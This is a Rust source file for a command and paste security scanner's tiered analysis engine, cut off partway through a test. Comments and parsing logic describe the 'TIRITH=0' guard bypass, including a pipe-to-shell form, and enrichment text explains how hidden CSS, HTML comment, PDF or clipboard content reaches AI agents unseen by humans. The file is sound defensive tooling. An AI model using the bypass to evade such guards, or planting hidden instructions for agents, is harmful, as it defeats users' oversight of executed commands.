use std::time::Instant;

use crate::extract::{self, ScanContext};
use crate::normalize;
use crate::policy::Policy;
use crate::tokenize::ShellType;
use crate::verdict::{Finding, Timings, Verdict};

/// Extract the raw path from a URL string before any normalization.
fn extract_raw_path_from_url(raw: &str) -> Option<String> {
    if let Some(idx) = raw.find("://") {
        let after = &raw[idx + 3..];
        if let Some(slash_idx) = after.find('/') {
            // Find end of path (before ? or #)
            let path_start = &after[slash_idx..];
            let end = path_start.find(['?', '#']).unwrap_or(path_start.len());
            return Some(path_start[..end].to_string());
        }
    }
    None
}

/// Analysis context passed through the pipeline.
pub struct AnalysisContext {
    pub input: String,
    pub shell: ShellType,
    pub scan_context: ScanContext,
    pub raw_bytes: Option<Vec<u8>>,
    pub interactive: bool,
    pub cwd: Option<String>,
    /// File path being scanned (only populated for ScanContext::FileScan).
    pub file_path: Option<std::path::PathBuf>,
    /// Only populated for ScanContext::FileScan. When None, configfile checks use
    /// `file_path`'s parent as implicit repo root.
    pub repo_root: Option<String>,
    /// True when `file_path` was explicitly provided by the user as a config file.
    pub is_config_override: bool,
    /// Clipboard HTML content for rich-text paste analysis.
    /// Only populated when `tirith paste --html <path>` is used.
    pub clipboard_html: Option<String>,
}

/// Check if a VAR=VALUE word is `TIRITH=0`, stripping optional surrounding quotes
/// from the value (handles `TIRITH='0'` and `TIRITH="0"`).
fn is_tirith_zero_assignment(word: &str) -> bool {
    if let Some((name, raw_val)) = word.split_once('=') {
        let val = raw_val.trim_matches(|c: char| c == '\'' || c == '"');
        if name == "TIRITH" && val == "0" {
            return true;
        }
    }
    false
}

/// Check if the input contains an inline `TIRITH=0` bypass prefix.
/// Handles POSIX bare prefix (`TIRITH=0 cmd`), env wrappers (`env -i TIRITH=0 cmd`),
/// and PowerShell env syntax (`$env:TIRITH="0"; cmd`).
fn find_inline_bypass(input: &str, shell: ShellType) -> bool {
    use crate::tokenize;

    if matches!(shell, ShellType::Posix | ShellType::Fish) {
        let segments = tokenize::tokenize(input, shell);
        // Tirith documents `TIRITH=0 <cmd> | <interp>` as a whole-line bypass
        // (README.md:539, TIRITH.md:804). Multi-segment inputs joined ONLY by
        // pipe operators are part of that contract. Sequencing separators
        // (`&&`, `||`, `;`, `&`) form multiple independent commands; bypass
        // must not suppress analysis of the later ones. See issue #78 (which
        // regressed the fix originally shipped for #30).
        if !all_pipe_separated(&segments) || has_unquoted_ampersand(input, shell) {
            return false;
        }
    }

    let words = split_raw_words(input, shell);
    if words.is_empty() {
        return false;
    }

    // POSIX / Fish: VAR=VALUE prefix or env wrapper
    // (Fish 3.1+ and all POSIX shells support `TIRITH=0 command`)

    // Case 1: Leading VAR=VALUE assignments before the command
    let mut idx = 0;
    while idx < words.len() && tokenize::is_env_assignment(&words[idx]) {
        if is_tirith_zero_assignment(&words[idx]) {
            return true;
        }
        idx += 1;
    }

    // Case 2: First real word is `env` — parse env-style args
    if idx < words.len() {
        let cmd = words[idx].rsplit('/').next().unwrap_or(&words[idx]);
        let cmd = cmd.trim_matches(|c: char| c == '\'' || c == '"');
        if cmd == "env" {
            idx += 1;
            while idx < words.len() {
                let w = &words[idx];
                if w == "--" {
                    idx += 1;
                    // After --, remaining are VAR=VALUE or command
                    break;
                }
                if tokenize::is_env_assignment(w) {
                    if is_tirith_zero_assignment(w) {
                        return true;
                    }
                    idx += 1;
                    continue;
                }
                if w.starts_with('-') {
                    if w.starts_with("--") {
                        if env_long_flag_takes_value(w) && !w.contains('=') {
                            idx += 2;
                        } else {
                            idx += 1;
                        }
                        continue;
                    }
                    // Short flags that take a separate value arg
                    if w == "-u" || w == "-C" || w == "-S" {
                        idx += 2;
                        continue;
                    }
                    idx += 1;
                    continue;
                }
                // Non-flag, non-assignment = the command, stop
                break;
            }
            // Check remaining words after -- for TIRITH=0
            while idx < words.len() && tokenize::is_env_assignment(&words[idx]) {
                if is_tirith_zero_assignment(&words[idx]) {
                    return true;
                }
                idx += 1;
            }
        }
    }

    // PowerShell: $env:TIRITH="0" or $env:TIRITH = "0" (before first ;)
    if shell == ShellType::PowerShell {
        for word in &words {
            if is_powershell_tirith_bypass(word) {
                return true;
            }
        }
        // Multi-word: $env:TIRITH = "0" (space around =)
        if words.len() >= 3 {
            for window in words.windows(3) {
                if is_powershell_env_ref(&window[0], "TIRITH")
                    && window[1] == "="
                    && strip_surrounding_quotes(&window[2]) == "0"
                {
                    return true;
                }
            }
        }
    }

    // Cmd: "set TIRITH=0 & ..." or 'set "TIRITH=0" & ...'
    // In cmd.exe, `set TIRITH="0"` stores the literal `"0"` (with quotes) as the
    // value, so we must NOT strip inner quotes from the value. Only bare `TIRITH=0`
    // and whole-token-quoted `"TIRITH=0"` are real bypasses.
    if shell == ShellType::Cmd && words.len() >= 2 {
        let first = words[0].to_lowercase();
        if first == "set" {
            let second = strip_double_quotes_only(&words[1]);
            if let Some((name, val)) = second.split_once('=') {
                if name == "TIRITH" && val == "0" {
                    return true;
                }
            }
        }
    }

    false
}

fn env_long_flag_takes_value(flag: &str) -> bool {
    let name = flag.split_once('=').map(|(name, _)| name).unwrap_or(flag);
    matches!(name, "--unset" | "--chdir" | "--split-string")
}

/// Check if a word is `$env:TIRITH=0` with optional quotes around the value.
/// The `$env:` prefix is matched case-insensitively (PowerShell convention).
fn is_powershell_tirith_bypass(word: &str) -> bool {
    if !word.starts_with('$') || word.len() < "$env:TIRITH=0".len() {
        return false;
    }
    let after_dollar = &word[1..];
    if !after_dollar
        .get(..4)
        .is_some_and(|s| s.eq_ignore_ascii_case("env:"))
    {
        return false;
    }
    let after_env = &after_dollar[4..];
    if !after_env
        .get(..7)
        .is_some_and(|s| s.eq_ignore_ascii_case("TIRITH="))
    {
        return false;
    }
    let value = &after_env[7..];
    strip_surrounding_quotes(value) == "0"
}

/// Check if a word is a PowerShell env var reference `$env:VARNAME` (no assignment).
fn is_powershell_env_ref(word: &str, var_name: &str) -> bool {
    if !word.starts_with('$') {
        return false;
    }
    let after_dollar = &word[1..];
    if !after_dollar
        .get(..4)
        .is_some_and(|s| s.eq_ignore_ascii_case("env:"))
    {
        return false;
    }
    after_dollar[4..].eq_ignore_ascii_case(var_name)
}

/// Strip a single layer of matching quotes (single or double) from a string.
fn strip_surrounding_quotes(s: &str) -> &str {
    if s.len() >= 2
        && ((s.starts_with('"') && s.ends_with('"')) || (s.starts_with('\'') && s.ends_with('\'')))
    {
        &s[1..s.len() - 1]
    } else {
        s
    }
}

/// Strip a single layer of matching double quotes only. For Cmd, single quotes are literal.
fn strip_double_quotes_only(s: &str) -> &str {
    if s.len() >= 2 && s.starts_with('"') && s.ends_with('"') {
        &s[1..s.len() - 1]
    } else {
        s
    }
}

/// Split input into raw words respecting quotes (for bypass/self-invocation parsing).
/// Unlike tokenize(), this doesn't split on pipes/semicolons — just whitespace-splits
/// the raw input to inspect the first segment's words.
///
/// Shell-aware: POSIX uses backslash as escape inside double-quotes and bare context;
/// PowerShell uses backtick (`` ` ``) instead.
fn split_raw_words(input: &str, shell: ShellType) -> Vec<String> {
    let escape_char = match shell {
        ShellType::PowerShell => '`',
        ShellType::Cmd => '^',
        _ => '\\',
    };

    // Take only up to the first unquoted pipe/semicolon/&&/||
    let mut words = Vec::new();
    let mut current = String::new();
    let chars: Vec<char> = input.chars().collect();
    let len = chars.len();
    let mut i = 0;

    while i < len {
        let ch = chars[i];
        match ch {
            ' ' | '\t' if !current.is_empty() => {
                words.push(current.clone());
                current.clear();
                i += 1;
                while i < len && (chars[i] == ' ' || chars[i] == '\t') {
                    i += 1;
                }
            }
            ' ' | '\t' => {
                i += 1;
            }
            '|' | '\n' | '&' => break, // Stop at segment boundary
            ';' if shell != ShellType::Cmd => break,
            '#' if shell == ShellType::PowerShell => break,
            '\'' if shell != ShellType::Cmd => {
                current.push(ch);
                i += 1;
                while i < len && chars[i] != '\'' {
                    current.push(chars[i]);
                    i += 1;
                }
                if i < len {
                    current.push(chars[i]);
                    i += 1;
                }
            }
            '"' => {
                current.push(ch);
                i += 1;
                while i < len && chars[i] != '"' {
                    if chars[i] == escape_char && i + 1 < len {
                        current.push(chars[i]);
                        current.push(chars[i + 1]);
                        i += 2;
                    } else {
                        current.push(chars[i]);
                        i += 1;
                    }
                }
                if i < len {
                    current.push(chars[i]);
                    i += 1;
                }
            }
            c if c == escape_char && i + 1 < len => {
                current.push(chars[i]);
                current.push(chars[i + 1]);
                i += 2;
            }
            _ => {
                current.push(ch);
                i += 1;
            }
        }
    }
    if !current.is_empty() {
        words.push(current);
    }
    words
}

/// Whether all non-leading segments are joined only by pipe operators (`|`, `|&`).
///
/// Returns `true` for a single segment (trivially). Used by `find_inline_bypass`
/// to distinguish the documented `TIRITH=0 cmd | interp` bypass shape from
/// sequencing chains like `TIRITH=0 cmd && evil` or `TIRITH=0 cmd ; evil` where
/// the bypass must not apply to the second command. Issue #78.
fn all_pipe_separated(segments: &[crate::tokenize::Segment]) -> bool {
    segments
        .iter()
        .skip(1)
        .all(|s| matches!(s.preceding_separator.as_deref(), Some("|") | Some("|&")))
}

/// Check if input contains an unquoted `&` (backgrounding operator).
fn has_unquoted_ampersand(input: &str, shell: ShellType) -> bool {
    let escape_char = match shell {
        ShellType::PowerShell => '`',
        ShellType::Cmd => '^',
        _ => '\\',
    };
    let chars: Vec<char> = input.chars().collect();
    let len = chars.len();
    let mut i = 0;
    while i < len {
        match chars[i] {
            '\'' if shell != ShellType::Cmd => {
                i += 1;
                while i < len && chars[i] != '\'' {
                    i += 1;
                }
                if i < len {
                    i += 1;
                }
            }
            '"' => {
                i += 1;
                while i < len && chars[i] != '"' {
                    if chars[i] == escape_char && i + 1 < len {
                        i += 2;
                    } else {
                        i += 1;
                    }
                }
                if i < len {
                    i += 1;
                }
            }
            c if c == escape_char && i + 1 < len => {
                i += 2; // skip escaped char
            }
            '&' => return true,
            _ => i += 1,
        }
    }
    false
}

/// Run the tiered analysis pipeline.
pub fn analyze(ctx: &AnalysisContext) -> Verdict {
    analyze_inner(ctx).0
}

/// Run the tiered analysis pipeline, returning the loaded policy alongside the verdict.
///
/// Use this from enforcement callers (check, gateway, MCP) that need the policy
/// for post-processing — avoids a redundant `Policy::discover()` call.
pub fn analyze_returning_policy(ctx: &AnalysisContext) -> (Verdict, Policy) {
    analyze_inner(ctx)
}

/// Shared implementation for `analyze()` and `analyze_returning_policy()`.
fn analyze_inner(ctx: &AnalysisContext) -> (Verdict, Policy) {
    let start = Instant::now();

    // Tier 0: Check bypass flag
    let tier0_start = Instant::now();
    let bypass_env = std::env::var("TIRITH").ok().as_deref() == Some("0");
    // Inline bypass (`TIRITH=0 cmd | sh`) is honored only in Exec context.
    // Paste content is attacker-controllable (clipboard can be crafted), so a
    // `TIRITH=0` prefix in pasted text must NOT grant bypass. FileScan has no
    // notion of a typed bypass prefix either. Process-level TIRITH=0 env
    // (user's own shell env) still applies in every context.
    let bypass_inline =
        ctx.scan_context == ScanContext::Exec && find_inline_bypass(&ctx.input, ctx.shell);
    let bypass_requested = bypass_env || bypass_inline;
    let tier0_ms = tier0_start.elapsed().as_secs_f64() * 1000.0;

    // Tier 1: Fast scan (no I/O)
    let tier1_start = Instant::now();

    // Step 1 (paste only): byte-level scan for control chars
    let byte_scan_triggered = if ctx.scan_context == ScanContext::Paste {
        if let Some(ref bytes) = ctx.raw_bytes {
            let scan = extract::scan_bytes(bytes);
            scan.has_ansi_escapes
                || scan.has_control_chars
                || scan.has_bidi_controls
                || scan.has_zero_width
                || scan.has_invalid_utf8
                || scan.has_unicode_tags
                || scan.has_variation_selectors
                || scan.has_invisible_math_operators
                || scan.has_invisible_whitespace
                || scan.has_hangul_fillers
                || scan.has_confusable_text
        } else {
            false
        }
    } else {
        false
    };

    // Step 2: URL-like regex scan
    let regex_triggered = extract::tier1_scan(&ctx.input, ctx.scan_context);

    // Step 3 (exec only): check for bidi/zero-width/invisible chars even without URLs.
    // Issue #29 Arm B: exempt bytes inside the arg span of a first-segment
    // tirith inspection subcommand (`tirith diff/score/why/receipt/explain`).
    // The carveout only affects the eight Unicode-style rule classes already
    // filtered at tier 3 (see below) — ANSI/control/escape rules don't fire
    // in exec mode today.
    let inert_range = if ctx.scan_context == ScanContext::Exec {
        extract::tirith_inert_arg_range(&ctx.input, ctx.shell)
    } else {
        None
    };
    let exec_bidi_triggered = if ctx.scan_context == ScanContext::Exec {
        let scan = extract::scan_bytes(ctx.input.as_bytes());
        let scan = match inert_range.as_ref() {
            Some(r) => scan.with_ignored_range(r),
            None => scan,
        };
        scan.has_bidi_controls
            || scan.has_zero_width
            || scan.has_unicode_tags
            || scan.has_variation_selectors
            || scan.has_invisible_math_operators
            || scan.has_invisible_whitespace
            || scan.has_hangul_fillers
            || scan.has_confusable_text
    } else {
        false
    };

    let tier1_ms = tier1_start.elapsed().as_secs_f64() * 1000.0;

    // If nothing triggered, fast exit
    if !byte_scan_triggered && !regex_triggered && !exec_bidi_triggered {
        let total_ms = start.elapsed().as_secs_f64() * 1000.0;
        return (
            Verdict::allow_fast(
                1,
                Timings {
                    tier0_ms,
                    tier1_ms,
                    tier2_ms: None,
                    tier3_ms: None,
                    total_ms,
                },
            ),
            // Load partial policy even on fast-exit so callers get DLP patterns
            // for audit redaction. discover_partial is local-only and cheap.
            Policy::discover_partial(ctx.cwd.as_deref()),
        );
    }

    // Tier 2: Policy + data loading (deferred I/O)
    let tier2_start = Instant::now();

    if bypass_requested {
        // Load partial policy to check bypass settings
        let policy = Policy::discover_partial(ctx.cwd.as_deref());
        let allow_bypass = if ctx.interactive {
            policy.allow_bypass_env
        } else {
            policy.allow_bypass_env_noninteractive
        };

        if allow_bypass {
            let tier2_ms = tier2_start.elapsed().as_secs_f64() * 1000.0;
            let total_ms = start.elapsed().as_secs_f64() * 1000.0;
            let mut verdict = Verdict::allow_fast(
                2,
                Timings {
                    tier0_ms,
                    tier1_ms,
                    tier2_ms: Some(tier2_ms),
                    tier3_ms: None,
                    total_ms,
                },
            );
            verdict.bypass_requested = true;
            verdict.bypass_honored = true;
            verdict.interactive_detected = ctx.interactive;
            verdict.policy_path_used = policy.path.clone();
            // Log bypass to audit (include custom DLP patterns from partial policy)
            crate::audit::log_verdict(
                &verdict,
                &ctx.input,
                None,
                None,
                &policy.dlp_custom_patterns,
            );
            return (verdict, policy);
        }
    }

    let mut policy = Policy::discover(ctx.cwd.as_deref());
    policy.load_user_lists();
    policy.load_org_lists(ctx.cwd.as_deref());
    policy.load_trust_entries(ctx.cwd.as_deref());

    // Load threat intelligence DB (fail-open: None if unavailable)
    let threat_db: Option<std::sync::Arc<crate::threatdb::ThreatDb>> =
        crate::threatdb::ThreatDb::cached();

    let tier2_ms = tier2_start.elapsed().as_secs_f64() * 1000.0;

    // Tier 3: Full analysis
    let tier3_start = Instant::now();
    let mut findings = Vec::new();

    // Track extracted URLs for allowlist/blocklist (Exec/Paste only)
    let mut extracted = Vec::new();

    if ctx.scan_context == ScanContext::FileScan {
        // FileScan: byte scan + configfile rules ONLY.
        // Does NOT run command/env/URL-extraction rules.
        let byte_input = if let Some(ref bytes) = ctx.raw_bytes {
            bytes.as_slice()
        } else {
            ctx.input.as_bytes()
        };
        let byte_findings = crate::rules::terminal::check_bytes(byte_input);
        findings.extend(byte_findings);

        // Config file detection rules
        findings.extend(crate::rules::configfile::check(
            &ctx.input,
            ctx.file_path.as_deref(),
            ctx.repo_root.as_deref().map(std::path::Path::new),
            ctx.is_config_override,
        ));

        // Code file pattern scanning rules
        if crate::rules::codefile::is_code_file(
            ctx.file_path.as_deref().and_then(|p| p.to_str()),
            &ctx.input,
        ) {
            findings.extend(crate::rules::codefile::check(
                &ctx.input,
                ctx.file_path.as_deref().and_then(|p| p.to_str()),
            ));
        }

        // Rendered content rules (file-type gated)
        if crate::rules::rendered::is_renderable_file(ctx.file_path.as_deref()) {
            // PDF files get their own parser
            let is_pdf = ctx
                .file_path
                .as_deref()
                .and_then(|p| p.extension())
                .and_then(|e| e.to_str())
                .map(|e| e.eq_ignore_ascii_case("pdf"))
                .unwrap_or(false);

            if is_pdf {
                let pdf_bytes = ctx.raw_bytes.as_deref().unwrap_or(ctx.input.as_bytes());
                findings.extend(crate::rules::rendered::check_pdf(pdf_bytes));
            } else {
                findings.extend(crate::rules::rendered::check(
                    &ctx.input,
                    ctx.file_path.as_deref(),
                ));
            }
        }
    } else {
        // Exec/Paste: standard pipeline

        // Run byte-level rules for paste context
        if ctx.scan_context == ScanContext::Paste {
            if let Some(ref bytes) = ctx.raw_bytes {
                let byte_findings = crate::rules::terminal::check_bytes(bytes);
                findings.extend(byte_findings);
            }
            // Check for hidden multiline content in pasted text
            let multiline_findings = crate::rules::terminal::check_hidden_multiline(&ctx.input);
            findings.extend(multiline_findings);

            // Check clipboard HTML for hidden content (rich-text paste analysis)
            if let Some(ref html) = ctx.clipboard_html {
                let clipboard_findings =
                    crate::rules::terminal::check_clipboard_html(html, &ctx.input);
                findings.extend(clipboard_findings);
            }
        }

        // Invisible character checks apply to both exec and paste contexts
        if ctx.scan_context == ScanContext::Exec {
            let byte_input = ctx.input.as_bytes();
            let scan = extract::scan_bytes(byte_input);
            // Issue #29 Arm B: re-apply the inert-range carveout here so tier-3
            // findings line up with tier-1's `exec_bidi_triggered` decision.
            let scan = match inert_range.as_ref() {
                Some(r) => scan.with_ignored_range(r),
                None => scan,
            };
            if scan.has_bidi_controls
                || scan.has_zero_width
                || scan.has_unicode_tags
                || scan.has_variation_selectors
                || scan.has_invisible_math_operators
                || scan.has_invisible_whitespace
                || scan.has_hangul_fillers
                || scan.has_confusable_text
            {
                // Pass the inert range down into check_bytes itself so rules
                // with `Evidence::Text` (e.g. UnicodeTags) are also suppressed
                // at scan time, not by offset-only post-filter. An offset
                // post-filter misses Text evidence — that was the leak in the
                // previous iteration of this fix.
                let ignore_ranges: &[std::ops::Range<usize>] = inert_range.as_slice();
                let byte_findings =
                    crate::rules::terminal::check_bytes_with_ignore(byte_input, ignore_ranges);
                // Only keep invisible-char findings for exec context.
                findings.extend(byte_findings.into_iter().filter(|f| {
                    matches!(
                        f.rule_id,
                        crate::verdict::RuleId::BidiControls
                            | crate::verdict::RuleId::ZeroWidthChars
                            | crate::verdict::RuleId::UnicodeTags
                            | crate::verdict::RuleId::InvisibleMathOperator
                            | crate::verdict::RuleId::VariationSelector
                            | crate::verdict::RuleId::InvisibleWhitespace
                            | crate::verdict::RuleId::HangulFiller
                            | crate::verdict::RuleId::ConfusableText
                    )
                }));
            }
        }

        // Extract and analyze URLs
        extracted = extract::extract_urls(&ctx.input, ctx.shell);

        for url_info in &extracted {
            // Normalize path if available — use raw extracted URL's path for non-ASCII detection
            // since url::Url percent-encodes non-ASCII during parsing
            let raw_path = extract_raw_path_from_url(&url_info.raw);
            let normalized_path = url_info.parsed.path().map(normalize::normalize_path);

            // Run all rule categories
            let hostname_findings = crate::rules::hostname::check(&url_info.parsed, &policy);
            findings.extend(hostname_findings);

            let path_findings = crate::rules::path::check(
                &url_info.parsed,
                normalized_path.as_ref(),
                raw_path.as_deref(),
            );
            findings.extend(path_findings);

            let transport_findings =
                crate::rules::transport::check(&url_info.parsed, url_info.in_sink_context);
            findings.extend(transport_findings);

            let ecosystem_findings = crate::rules::ecosystem::check(&url_info.parsed);
            findings.extend(ecosystem_findings);
        }

        // Threat intelligence rules (local DB lookup, no network I/O)
        let threat_findings = crate::rules::threatintel::check(
            &ctx.input,
            ctx.shell,
            &extracted,
            threat_db.as_deref(),
        );
        findings.extend(threat_findings);

        // Run command-shape rules on full input
        let command_findings = crate::rules::command::check(
            &ctx.input,
            ctx.shell,
            ctx.cwd.as_deref(),
            ctx.scan_context,
        );
        findings.extend(command_findings);

        // Run credential leak detection rules
        let cred_findings =
            crate::rules::credential::check(&ctx.input, ctx.shell, ctx.scan_context);
        findings.extend(cred_findings);

        // Run environment rules
        let env_findings = crate::rules::environment::check(&crate::rules::environment::RealEnv);
        findings.extend(env_findings);

        // Policy-driven network deny/allow
        if !policy.network_deny.is_empty() {
            let net_findings = crate::rules::command::check_network_policy(
                &ctx.input,
                ctx.shell,
                &policy.network_deny,
                &policy.network_allow,
            );
            findings.extend(net_findings);
        }
    }

    // Custom YAML detection rules
    if !policy.custom_rules.is_empty() {
        let compiled = crate::rules::custom::compile_rules(&policy.custom_rules);
        let custom_findings = crate::rules::custom::check(&ctx.input, ctx.scan_context, &compiled);
        findings.extend(custom_findings);
    }

    // Apply policy severity overrides
    for finding in &mut findings {
        if let Some(override_sev) = policy.severity_override(&finding.rule_id) {
            finding.severity = override_sev;
        }
    }

    // Filter by allowlist/blocklist
    // Blocklist: if any extracted URL matches blocklist, escalate to Block
    for url_info in &extracted {
        if policy.is_blocklisted(&url_info.raw) {
            findings.push(Finding {
                rule_id: crate::verdict::RuleId::PolicyBlocklisted,
                severity: crate::verdict::Severity::Critical,
                title: "URL matches blocklist".to_string(),
                description: format!("URL '{}' matches a blocklist pattern", url_info.raw),
                evidence: vec![crate::verdict::Evidence::Url {
                    raw: url_info.raw.clone(),
                }],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            });
        }
    }

    // Allowlist: remove findings for URLs that match allowlist
    // (blocklist takes precedence — if blocklisted, findings remain)
    if !policy.allowlist.is_empty() || !policy.allowlist_rules.is_empty() {
        let blocklisted_urls: Vec<&str> = extracted
            .iter()
            .filter(|u| policy.is_blocklisted(&u.raw))
            .map(|u| u.raw.as_str())
            .collect();

        findings.retain(|f| {
            let urls_in_evidence: Vec<&str> = f
                .evidence
                .iter()
                .filter_map(|e| match e {
                    crate::verdict::Evidence::Url { raw } => Some(raw.as_str()),
                    _ => None,
                })
                .collect();

            if urls_in_evidence.is_empty() {
                return true;
            }

            let rule_allowlisted = |url: &str| {
                policy.is_allowlisted_for_rule(&f.rule_id.to_string(), url)
                    || f.custom_rule_id.as_deref().is_some_and(|custom_rule_id| {
                        policy.is_allowlisted_for_rule(custom_rule_id, url)
                    })
            };

            // Keep if any referenced URL is blocklisted. Otherwise only drop the
            // finding when every referenced URL is allowlisted for this finding.
            urls_in_evidence
                .iter()
                .any(|url| blocklisted_urls.contains(url))
                || !urls_in_evidence
                    .iter()
                    .all(|url| policy.is_allowlisted(url) || rule_allowlisted(url))
        });
    }

    // Enrichment is always enabled in the single-tier runtime.
    enrich_pro(&mut findings);
    enrich_team(&mut findings);

    // Early-access suppression is disabled in the single-tier runtime.
    crate::rule_metadata::filter_early_access(&mut findings, crate::license::Tier::Enterprise);

    let tier3_ms = tier3_start.elapsed().as_secs_f64() * 1000.0;
    let total_ms = start.elapsed().as_secs_f64() * 1000.0;

    let mut verdict = Verdict::from_findings(
        findings,
        3,
        Timings {
            tier0_ms,
            tier1_ms,
            tier2_ms: Some(tier2_ms),
            tier3_ms: Some(tier3_ms),
            total_ms,
        },
    );
    verdict.bypass_requested = bypass_requested;
    verdict.bypass_available = if ctx.interactive {
        policy.allow_bypass_env
    } else {
        policy.allow_bypass_env_noninteractive
    };
    verdict.interactive_detected = ctx.interactive;
    verdict.policy_path_used = policy.path.clone();
    verdict.urls_extracted_count = Some(extracted.len());

    (verdict, policy)
}

// ---------------------------------------------------------------------------
// Paranoia tier filtering (Phase 15)
// ---------------------------------------------------------------------------

/// Filter a verdict's findings by paranoia level.
///
/// This is an output-layer filter — the engine always detects everything.
/// CLI/MCP call this after `analyze()` to reduce noise at lower paranoia levels.
///
/// - Paranoia 1-2: Medium+ findings only
/// - Paranoia 3: also show Low findings
/// - Paranoia 4: also show Info findings
pub fn filter_findings_by_paranoia(verdict: &mut Verdict, paranoia: u8) {
    retain_by_paranoia(&mut verdict.findings, paranoia);
    verdict.action = recalculate_action(&verdict.findings);
}

/// Filter a Vec<Finding> by paranoia level.
/// Same logic as `filter_findings_by_paranoia` but operates on raw findings.
pub fn filter_findings_by_paranoia_vec(findings: &mut Vec<Finding>, paranoia: u8) {
    retain_by_paranoia(findings, paranoia);
}

/// Recalculate verdict action from the current findings (same logic as `Verdict::from_findings`).
fn recalculate_action(findings: &[Finding]) -> crate::verdict::Action {
    use crate::verdict::{Action, Severity};
    if findings.is_empty() {
        return Action::Allow;
    }
    let max_severity = findings
        .iter()
        .map(|f| f.severity)
        .max()
        .unwrap_or(Severity::Low);
    match max_severity {
        Severity::Critical | Severity::High => Action::Block,
        Severity::Medium | Severity::Low => Action::Warn,
        Severity::Info => Action::Allow,
    }
}

/// Shared paranoia retention logic.
fn retain_by_paranoia(findings: &mut Vec<Finding>, paranoia: u8) {
    let effective = paranoia.min(4);

    findings.retain(|f| match f.severity {
        crate::verdict::Severity::Info => effective >= 4,
        crate::verdict::Severity::Low => effective >= 3,
        _ => true, // Medium/High/Critical always shown
    });
}

// ---------------------------------------------------------------------------
// Finding enrichment
// ---------------------------------------------------------------------------

/// Pro enrichment: dual-view, decoded content, cloaking diffs, line numbers.
fn enrich_pro(findings: &mut [Finding]) {
    for finding in findings.iter_mut() {
        match finding.rule_id {
            // Rendered content findings: show what human sees vs what agent processes
            crate::verdict::RuleId::HiddenCssContent => {
                finding.human_view =
                    Some("Content hidden via CSS — invisible in rendered view".into());
                finding.agent_view = Some(format!(
                    "AI agent sees full text including CSS-hidden content. {}",
                    evidence_summary(&finding.evidence)
                ));
            }
            crate::verdict::RuleId::HiddenColorContent => {
                finding.human_view =
                    Some("Text blends with background — invisible to human eye".into());
                finding.agent_view = Some(format!(
                    "AI agent reads text regardless of color contrast. {}",
                    evidence_summary(&finding.evidence)
                ));
            }
            crate::verdict::RuleId::HiddenHtmlAttribute => {
                finding.human_view =
                    Some("Elements marked hidden/aria-hidden — not displayed".into());
                finding.agent_view = Some(format!(
                    "AI agent processes hidden element content. {}",
                    evidence_summary(&finding.evidence)
                ));
            }
            crate::verdict::RuleId::HtmlComment => {
                finding.human_view = Some("HTML comments not rendered in browser".into());
                finding.agent_view = Some(format!(
                    "AI agent reads comment content as context. {}",
                    evidence_summary(&finding.evidence)
                ));
            }
            crate::verdict::RuleId::MarkdownComment => {
                finding.human_view = Some("Markdown comments not rendered in preview".into());
                finding.agent_view = Some(format!(
                    "AI agent processes markdown comment content. {}",
                    evidence_summary(&finding.evidence)
                ));
            }
            crate::verdict::RuleId::PdfHiddenText => {
                finding.human_view = Some("Sub-pixel text invisible in PDF viewer".into());
                finding.agent_view = Some(format!(
                    "AI agent extracts all text including sub-pixel content. {}",
                    evidence_summary(&finding.evidence)
                ));
            }
            crate::verdict::RuleId::ClipboardHidden => {
                finding.human_view =
                    Some("Hidden content in clipboard HTML not visible in paste preview".into());
                finding.agent_view = Some(format!(
                    "AI agent processes full clipboard including hidden HTML. {}",
                    evidence_summary(&finding.evidence)
                ));
            }
            _ => {}
        }
    }
}

/// Summarize evidence entries for enrichment text.
fn evidence_summary(evidence: &[crate::verdict::Evidence]) -> String {
    let details: Vec<&str> = evidence
        .iter()
        .filter_map(|e| {
            if let crate::verdict::Evidence::Text { detail } = e {
                Some(detail.as_str())
            } else {
                None
            }
        })
        .take(3)
        .collect();
    if details.is_empty() {
        String::new()
    } else {
        format!("Details: {}", details.join("; "))
    }
}

/// Team enrichment: MITRE ATT&CK classification.
/// Uses the generated `mitre_id_for_rule` from `rule_explanations.toml` (single source of truth).
fn enrich_team(findings: &mut [Finding]) {
    for finding in findings.iter_mut() {
        if finding.mitre_id.is_none() {
            finding.mitre_id =
                crate::rule_explanations::mitre_id_for_rule(finding.rule_id).map(String::from);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn test_exec_bidi_without_url() {
        // Input with bidi control but no URL — should NOT fast-exit at tier 1
        let input = format!("echo hello{}world", '\u{202E}');
        let ctx = AnalysisContext {
            input,
            shell: ShellType::Posix,
            scan_context: ScanContext::Exec,
            raw_bytes: None,
            interactive: true,
            cwd: None,
            file_path: None,
            repo_root: None,
            is_config_override: false,
            clipboard_html: None,
        };
        let verdict = analyze(&ctx);
        // Should reach tier 3 (not fast-exit at tier 1)
        assert!(
            verdict.tier_reached >= 3,
            "bidi in exec should reach tier 3, got tier {}",
            verdict.tier_reached
        );
        // Should have findings about bidi
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| matches!(f.rule_id, crate::verdict::RuleId::BidiControls)),
            "should detect bidi controls in exec context"
        );
    }

    #[test]
    fn test_paranoia_filter_suppresses_info_low() {
        use crate::verdict::{Finding, RuleId, Severity, Timings, Verdict};

        let findings = vec![
            Finding {
                // Synthetic Info finding — VariationSelector is now Medium
                rule_id: RuleId::NonStandardPort,
                severity: Severity::Info,
                title: "info finding".into(),
                description: String::new(),
                evidence: vec![],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            },
            Finding {
                rule_id: RuleId::InvisibleWhitespace,
                severity: Severity::Low,
                title: "low finding".into(),
                description: String::new(),
                evidence: vec![],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            },
            Finding {
                rule_id: RuleId::HiddenCssContent,
                severity: Severity::High,
                title: "high finding".into(),
                description: String::new(),
                evidence: vec![],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            },
        ];

        let timings = Timings {
            tier0_ms: 0.0,
            tier1_ms: 0.0,
            tier2_ms: None,
            tier3_ms: None,
            total_ms: 0.0,
        };

        // Default paranoia (1): only Medium+ shown
        let mut verdict = Verdict::from_findings(findings.clone(), 3, timings.clone());
        filter_findings_by_paranoia(&mut verdict, 1);
        assert_eq!(
            verdict.findings.len(),
            1,
            "paranoia 1 should keep only High+"
        );
        assert_eq!(verdict.findings[0].severity, Severity::High);

        // Paranoia 2: still only Medium+ (free tier cap)
        let mut verdict = Verdict::from_findings(findings.clone(), 3, timings.clone());
        filter_findings_by_paranoia(&mut verdict, 2);
